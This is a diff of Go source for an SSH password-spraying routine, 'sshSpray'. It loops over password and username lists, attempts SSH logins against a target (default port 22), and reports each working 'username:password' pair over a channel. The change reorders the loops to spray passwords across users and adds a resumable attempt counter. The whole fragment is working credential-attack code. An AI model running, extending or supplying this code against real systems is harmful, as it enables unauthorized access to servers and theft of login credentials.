@@ -8,23 +8,27 @@ import (
 
 
 
-func sshSpray(wg *sync.WaitGroup, channelToCommunicate chan string,  taskToRun task) {
+func sshSpray(wg *sync.WaitGroup, channelToCommunicate chan string,  taskToRun task, storeResult *int) {
 	defer wg.Done()
+	internalCounter := 0
 	if taskToRun.target.port == 0 {
 		taskToRun.target.port = 22
 	}
-	for _,username := range taskToRun.usernames {
-		for _,password := range taskToRun.passwords {
-			sshClient, err := gossh.DialWithPasswd(stringifyTarget(taskToRun.target), username, password)
-			if err != nil {
-				fmt.Print("-")
+	for _,password := range taskToRun.passwords {
+		for _,username := range taskToRun.usernames {
+			if internalCounter >= *storeResult {
+				sshClient, err := gossh.DialWithPasswd(stringifyTarget(taskToRun.target), username, password)
+				if err != nil {
+					fmt.Print("-")
+				} else {
+					fmt.Print("+")
+					channelToCommunicate <- username+":"+password
+					sshClient.Close()
+				}
+				*storeResult++
 			} else {
-				fmt.Print("+")
-				channelToCommunicate <- username+":"+password
-				sshClient.Close()
 			}
-
-
+			internalCounter++
 		}
 	}
 
